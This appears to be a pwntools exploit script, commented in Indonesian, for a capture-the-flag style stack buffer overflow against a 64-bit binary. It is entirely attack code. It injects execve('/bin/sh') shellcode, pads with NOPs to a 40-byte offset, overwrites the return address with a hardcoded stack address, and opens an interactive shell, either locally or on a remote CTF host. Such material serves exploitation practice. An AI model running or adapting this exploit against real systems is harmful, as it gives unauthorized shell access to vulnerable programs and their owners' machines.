from pwn import *

# === KONFIGURASI ===
context.arch = 'amd64' # Set arsitektur ke 64-bit
exe = './vuln_64'
# Ganti dengan alamat buffer dari hasil 'p $rsp' atau 'info register rsi' di GDB
alamat_buffer = 0x7fffffffe4a0 

# Shellcode x64 execve("/bin/sh", 0, 0)
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"

mode = 'local'

if mode == 'local':
    p = process(exe)
else:
    p = remote('alamat.ctf.io', 9999)

# === PAYLOAD BUILDING ===
# Offset 40 didapat dari: 32 (buffer) + 8 (Saved RBP)
offset = 40 

payload = shellcode
payload += b"\x90" * (offset - len(shellcode)) # Padding NOP
payload += p64(alamat_buffer)                  # p64 untuk alamat 8 byte

# === KIRIM ===
p.sendline(payload)
p.interactive()